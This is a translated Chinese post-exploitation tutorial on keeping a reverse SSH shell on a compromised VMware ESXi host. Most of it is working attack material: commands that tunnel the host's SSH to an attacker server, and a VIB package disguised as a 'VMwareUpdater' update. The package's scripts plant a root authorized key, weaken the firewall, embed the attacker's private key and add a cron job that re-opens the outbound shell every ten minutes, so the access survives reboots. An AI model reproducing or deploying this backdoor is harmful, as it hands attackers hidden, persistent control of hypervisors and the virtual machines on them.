# 后渗透：ESXi反弹Shell

##### 译文声明
本文为翻译文章，仅供参考。具体内容和含义以原文为准。

## 前言
本文将演示如何在ESXi 6.5上使用OpenSSH实现反弹Shell，并通过VIB（vSphere Installation Bundle）实现持久化配置（即开机自启动且重启不丢失配置）。

### 关于VMware ESXi
VMware ESXi 是一款行业领先的裸机虚拟化平台。它直接安装在物理服务器上，可以将物理服务器划分为多个逻辑服务器，即虚拟机。

## 1. 网络拓扑
- **绿色线条**：表示ESXi服务器建立到攻击者服务器的反向连接。
- **蓝色线条**：表示攻击者通过反向转发的端口远程访问内网中的ESXi服务器。

## 2. 具体配置

### 2.1 攻击者服务器配置（假设IP为8.8.8.8）
```bash
vi /etc/ssh/sshd_config
# 添加以下内容：
GatewayPorts yes
```
**解释**：这将监听地址设置为0.0.0.0，默认情况下是127.0.0.1。

```bash
vi ~/.ssh/authorized_keys
# 将AttackerServer的公钥添加到这里
```

### 2.2 在攻击者PC上生成密钥，使用密钥连接攻击者服务器和内网ESXi
```bash
# 为ESXi服务器生成密钥
ssh-keygen -t rsa -b 4096 -f ESXi -C "PI:EMAIL"
chmod 600 ESXi

# 为攻击者服务器生成密钥
ssh-keygen -t rsa -b 4096 -f AttackerServer -C "PI:EMAIL"
chmod 600 AttackerServer
```

### 2.3 ESXi服务器配置
- **2.3.1 确认系统版本**
  ```bash
  esxcli system version get
  ```

- **2.3.2 查看防火墙状态**
  ```bash
  esxcli network firewall get
  esxcli network firewall ruleset rule list
  ```

- **2.3.3 防火墙允许SSH Server和SSH Client**
  ```bash
  vim-cmd hostsvc/firewall_enable_ruleset sshServer
  vim-cmd hostsvc/firewall_enable_ruleset sshClient
  esxcli network firewall ruleset set -a t -r sshServer
  ```

- **2.3.4 临时禁用防火墙**
  ```bash
  esxcli network firewall set -e=off
  # SSH Server和SSH Client默认端口都是22，攻击者服务器的SSH服务端口为60000，因此需要执行这条命令！
  ```

- **2.3.5 添加公钥，允许通过公钥登录**
  ```bash
  vi /etc/ssh/keys-root/authorized_keys
  # 将ESXi.pub的内容复制到这里
  ```

- **2.3.6 添加攻击者服务器的私钥，自动登录攻击者服务器**
  ```bash
  ssh root@8.8.8.8
  # 生成/.ssh/目录
  vi /.ssh/id_rsa
  # 将私钥文件AttackerServer的内容复制到这里
  chmod 0600 /.ssh/id_rsa
  ```

## 3. 反弹Shell
### 3.1 在ESXi上执行以下命令，反弹Shell
```bash
ssh -N -f -R 50000:localhost:22 root@8.8.8.8
```

### 3.2 在攻击者PC上执行以下命令，连接内网ESXi
```bash
ssh -p 50000 root@8.8.8.8 -i ESXi
```

## 4. 持久化配置
### 4.1 ESXi系统重启后配置丢失问题
**解释**：vmkernel使用的是内存文件系统，所有配置、日志和补丁都保存在内存中。而开机引导使用的镜像则保存在/bootbank和/altbootbank目录下。这也是为什么ESXi系统不需要在主机上安装，可以直接从远程镜像引导的原因，因为它会将远程镜像加载到内存中。

**注意**：只有通过VIB安装的文件才能在ESXi主机重启后保留。手动添加到visorfs的所有文件在ESXi主机重启后不会保留。

### 4.2 关于VIB（vSphere Installation Bundle）
ESXi系统的软件包以VIB方式发行，类似于RedHat系的RPM和Debian系的DEB。

**VIB**：VIB是ESXi的软件包。VMware及其合作伙伴将解决方案、驱动程序、CIM提供程序和应用程序打包为VIB。VIB可以从软件仓库获取，用于创建和自定义ISO镜像或通过异步安装VIB来升级ESXi主机。

### 4.3 定制VIB
#### 4.3.1 所需系统及软件
- SUSE Linux Enterprise Server 11 with SP2 DVD 1
  下载地址：[http://download.novell.com/SummaryFree.jsp?buildid=h0AOp5AT-18~](http://download.novell.com/SummaryFree.jsp?buildid=h0AOp5AT-18~)
- VIB Author RPM包
  下载地址：[https://labs.vmware.com/flings/vib-author](https://labs.vmware.com/flings/vib-author)

#### 4.3.2 建立如下目录结构

#### 4.3.3 关键文件
- **descriptor.xml**
  ```xml
  <component>
    <name>VMwareUpdater</name>
    <version>5.0.0-6.5.0</version>
    <vendor>community</vendor>
    <summary>VMware updater</summary>
    <description>Adds outbound ports required by the VMware from update feature</description>
    <acceptancelevel>CommunitySupported</acceptancelevel>
    <licenses>
      <license url="false" />
    </licenses>
    <depends/>
    <conflicts/>
    <provides>
      <rpm name="VMwareUpdater" epoch="0" version="5.0.0" release="6.5.0" arch="noarch" />
    </provides>
    <install-requires/>
    <rebootrequired>false</rebootrequired>
    <liveinstallallowed>true</liveinstallallowed>
    <liveinstallcapable>true</liveinstallcapable>
    <liveuninstallcapable>true</liveuninstallcapable>
    <classifications>
      <classification id="system"/>
    </classifications>
  </component>
  ```

- **auto-update.sh**
  ```bash
  #!/bin/sh
  export PATH=/bin:/sbin
  SIP=8.8.8.8
  TIP=$(ps -c | grep "attacker@8.8.8.8" | grep -v grep | cut -d"@" -f2)
  if [ "$SIP" = "$TIP" ]; then
      exit 0
  else
      ssh -i /etc/ssh/id_rsa -p 60000 -N -f -R 50000:localhost:22 -o ServerAliveInterval=60 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no attacker@8.8.8.8
  fi
  ```

- **999.vmware_update.sh**
  ```bash
  #!/bin/sh
  export PATH=/bin:/sbin
  vim-cmd hostsvc/firewall_enable_ruleset sshServer
  vim-cmd hostsvc/firewall_enable_ruleset sshClient
  esxcli network firewall ruleset set -a t -r sshServer
  echo "ESXi.pub文件内容" >> /etc/ssh/keys-root/authorized_keys
  chmod 1600 /etc/ssh/keys-root/authorized_keys
  /bin/kill $(cat /var/run/crond.pid)
  /bin/echo "*/10 * * * * /etc/auto-update.sh" >> /var/spool/cron/crontabs/root
  /usr/lib/vmware/busybox/bin/busybox crond
  ```

- **stage/payloads/payload1/etc/ssh/id_rsa**
  私钥AttackerServer的内容

- **vmware_auto_update.xml**
  ```xml
  <firewallRules>
    <rule id="VMwareUpdater">
      <direction>outbound</direction>
      <protocol>tcp</protocol>
      <porttype>dst</porttype>
      <portrange>
        <low>0</low>
        <high>65535</high>
      </portrange>
      <ip>
        <ipv4>any</ipv4>
      </ip>
      <enabled>true</enabled>
      <required>false</required>
    </rule>
  </firewallRules>
  ```

#### 4.3.4 生成最终的具备反弹Shell功能的VIB包
```bash
# 生成并复制VMwareUpdater.vib到ESXi主机
vibauthor -C -t stage -v VMwareUpdater -f
scp VMwareUpdater.vib root@remote:/tmp/VMwareUpdater.vib
```

### 4.4 安装VIB包，反弹Shell
```bash
# 临时关闭防火墙（必须！）
esxcli network firewall set -e=off

# 设置级别为CommunitySupported
esxcli software acceptance set --level=CommunitySupported

# 安装VIB包
esxcli software vib install -v /tmp/VMwareUpdater.vib -f

# 开启防火墙
esxcli network firewall set -e=on
```

## 5. 测试
1. 等待10分钟（时间配置：/var/spool/cron/crontabs/root），反弹Shell连接成功。
2. 重启ESXi，等待10分钟后，反弹Shell连接成功。

**为了方便大家测试，相关文件已打包上传至GitHub。**

## 6. 参考资料
1. 如何在ESXi上创建持久化的防火墙规则
2. 如何在VMware ESXi上安装VIB
3. 如何在ESXi 5.5中创建定时任务以回收精简置备存储空间
4. SSH隧道——本地和远程端口转发详解与示例